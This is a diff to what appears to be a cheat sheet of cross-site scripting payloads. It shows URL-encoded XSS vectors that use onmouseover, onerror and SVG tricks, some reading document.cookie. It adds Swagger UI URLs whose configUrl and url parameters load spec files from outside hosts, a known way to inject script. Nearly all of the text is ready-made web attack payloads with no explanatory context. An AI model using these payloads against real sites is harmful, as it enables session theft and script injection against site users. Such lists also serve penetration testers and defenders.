@@ -18,3 +18,10 @@
 - +%22+onmouseover=%22alert(document.cookie)%22%3E%3C!--
 - javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
 - <svg/%20src=x%20onmouseover%3D"alert%26%230000000040%3B1)
+
+## Swagger 
+- http://example(.)com/swagger-ui/index.html?configUrl=https://jumpy-floor.surge(.)sh/test.json
+
+- http://example(.)com/swagger-ui/index.html?url=https://jumpy-floor.surge(.)sh/test.yaml
+
+- http://example(.)com/swagger-ui/index.html?configUrl=https://xss.smarpo(.)com/test.json&url=https://jumpy-floor.surge(.)sh/test.yaml
